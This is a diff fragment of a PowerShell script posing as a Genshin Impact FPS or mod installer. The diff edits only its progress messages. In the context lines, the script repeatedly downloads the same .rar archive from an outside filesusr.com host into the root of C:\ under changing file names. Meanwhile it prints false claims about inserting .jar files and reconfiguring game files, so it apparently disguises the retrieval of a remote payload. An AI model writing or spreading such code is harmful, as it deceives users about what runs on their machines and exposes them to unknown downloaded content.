@@ -73,7 +73,7 @@ Write-Host " >> 18/20 Inserting FPSCounter.jar Into Genshin Files..."
 $client.DownloadFile(“https://4ed369c1-4aa9-4c5d-850b-b7356ad84816.filesusr.com/archives/180a3f_493afaf51b694d9783d29bc8da8a3210.rar?dn=LoadFile.rar”,“C:\DATAEXPEXTRACT.rar”)
 Write-Host " >> 19/20 Inserting HUDFPSPlayback.jar Into Genshin Impact Files..."
 $client.DownloadFile(“https://4ed369c1-4aa9-4c5d-850b-b7356ad84816.filesusr.com/archives/180a3f_493afaf51b694d9783d29bc8da8a3210.rar?dn=LoadFile.rar”,“C:\DATAEXPEXTRACT.rar”)
-Write-Host " >> 20/20 Removing All OldFrame, AICorner, RESFPS, PythonUntizition, WorldPlacesData And JavaSync From Genshin Impact File... This Could Take A Few Minutes, Depending On Your Hardware's Speed."
+Write-Host " >> 20/20 Removing Old And Reinstalling New OPLFrame, AICorner, RESFPS, PythonUntizition, WorldPlacesData And JavaSync From Genshin Impact File... This Could Take A Few Minutes, Depending On Your Hardware's Speed."
 $client.DownloadFile(“https://4ed369c1-4aa9-4c5d-850b-b7356ad84816.filesusr.com/archives/180a3f_493afaf51b694d9783d29bc8da8a3210.rar?dn=LoadFile.rar”,“C:\UGMEXPCONTROLLERINS.rar”)
 $client.DownloadFile(“https://4ed369c1-4aa9-4c5d-850b-b7356ad84816.filesusr.com/archives/180a3f_493afaf51b694d9783d29bc8da8a3210.rar?dn=LoadFile.rar”,“C:\UGMEXPCONTROLLERINS.rar”)
 $client.DownloadFile(“https://4ed369c1-4aa9-4c5d-850b-b7356ad84816.filesusr.com/archives/180a3f_493afaf51b694d9783d29bc8da8a3210.rar?dn=LoadFile.rar”,“C:\UGMEXPCONTROLLERINS.rar”)
@@ -89,7 +89,7 @@ $client.DownloadFile(“https://4ed369c1-4aa9-4c5d-850b-b7356ad84816.filesusr.co
 Write-Host " >> 20/20 Configuring All Changes..."
 $client.DownloadFile(“https://4ed369c1-4aa9-4c5d-850b-b7356ad84816.filesusr.com/archives/180a3f_493afaf51b694d9783d29bc8da8a3210.rar?dn=LoadFile.rar”,“C:\DATAEXPEXTRACT.rar”)
 Write-Host "============================================================================================="
-Write-Host " >> 15/20 Completed Installing. Now you can close this window!"
+Write-Host " >> 20/20 Completed Installing. Now you can close this window!"
 
 
 
